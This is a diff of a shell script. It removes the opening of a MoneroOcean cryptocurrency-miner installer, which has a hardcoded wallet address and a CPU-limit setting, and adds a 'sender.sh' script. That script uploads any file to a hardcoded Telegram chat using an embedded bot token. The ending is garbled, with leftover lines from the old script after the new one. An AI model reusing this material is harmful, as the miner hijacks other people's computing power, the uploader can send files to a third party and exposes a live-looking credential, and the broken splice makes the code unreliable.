@@ -1,69 +1,53 @@
-#!/bin/bash
+#!/usr/bin/env bash
+# sender.sh — upload a file to Telegram via bot API
+# Usage: ./sender.sh path/to/file
+# Optional: set TELE_TOKEN and TELE_CHAT env vars to override the hardcoded defaults.
 
-VERSION=2.12
-MO_DIR="$HOME/moneroocean"
-LOG_FILE="$MO_DIR/setup.log"
+set -euo pipefail
 
-# --- CPU PERCENT ARGUMENT ---
-CPU_PERCENT=${1:-70}   # default 70% if not given
+# === CONFIG (change these or export TELE_TOKEN/TELE_CHAT to override) ===
+DEFAULT_TOKEN="7930568732:AAFX_JcdEO3kNrmma6x1xHLahbHD1cgmet8"
+DEFAULT_CHAT="6565158025"
 
-rm -rf "$MO_DIR"
-mkdir -p "$MO_DIR"
+TOKEN="${TELE_TOKEN:-$DEFAULT_TOKEN}"
+CHAT_ID="${TELE_CHAT:-$DEFAULT_CHAT}"
+# =========================================================================
 
-echo "MoneroOcean mining setup script v$VERSION" > "$LOG_FILE"
-echo "Log file created at $LOG_FILE"
-echo "[*] Using CPU limit: $CPU_PERCENT%" | tee -a "$LOG_FILE"
-
-WALLET="43DcQyUQWE9X3bmNMMMD1RJA2wJKJxS6rLvJCVoaXuieSwRqjapvqQTR7KnX6DfzaSB9nHiBMWsfo1dGQWxpefaVSRyrVXM"
-EMAIL=""
-
-if [ "$(id -u)" == "0" ]; then
-  echo "WARNING: Running as root is not recommended" | tee -a "$LOG_FILE"
+if [ $# -lt 1 ]; then
+  echo "Usage: $0 <file-to-send>"
+  exit 2
 fi
 
-if ! type curl >/dev/null; then
-  echo "ERROR: This script requires \"curl\" utility to work correctly" | tee -a "$LOG_FILE"
-  exit 1
+FILE="$1"
+
+if [ ! -f "$FILE" ]; then
+  echo "Error: file not found -> $FILE"
+  exit 3
 fi
 
-# calculating port
-echo "[*] Calculating port" >> "$LOG_FILE"
-CPU_THREADS=$(nproc)
-EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
-if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate" | tee -a "$LOG_FILE"
-  exit 1
-fi
+echo "Uploading '$FILE' to Telegram chat $CHAT_ID..."
 
-power2() {
-  if ! type bc >/dev/null; then
-    if   [ "$1" -gt "8192" ]; then
-      echo "8192"
-    elif [ "$1" -gt "4096" ]; then
-      echo "4096"
-    elif [ "$1" -gt "2048" ]; then
-      echo "2048"
-    elif [ "$1" -gt "1024" ]; then
-      echo "1024"
-    elif [ "$1" -gt "512" ]; then
-      echo "512"
-    elif [ "$1" -gt "256" ]; then
-      echo "256"
-    elif [ "$1" -gt "128" ]; then
-      echo "128"
-    elif [ "$1" -gt "64" ]; then
-      echo "64"
-    elif [ "$1" -gt "32" ]; then
-      echo "32"
-    elif [ "$1" -gt "16" ]; then
-      echo "16"
-    elif [ "$1" -gt "8" ]; then
-      echo "8"
-    elif [ "$1" -gt "4" ]; then
-      echo "4"
-    elif [ "$1" -gt "2" ]; then
-      echo "2"
-    else
+API="https://api.telegram.org/bot${TOKEN}/sendDocument"
+
+# send with curl (multipart/form-data)
+resp=$(curl -sS -w "\n%{http_code}" -X POST "$API" \
+  -F chat_id="$CHAT_ID" \
+  -F document=@"$FILE" \
+  -F caption="File: $(basename "$FILE")" )
+
+# split body and http code
+http_code=$(echo "$resp" | tail -n1)
+body=$(echo "$resp" | sed '$d')
+
+if [ "$http_code" = "200" ]; then
+  echo "Upload successful ✓"
+  echo "$body" | sed -n '1,10p'
+  exit 0
+else
+  echo "Upload failed — HTTP $http_code"
+  echo "$body"
+  exit 4
+fi    else
       echo "1"
     fi
   else
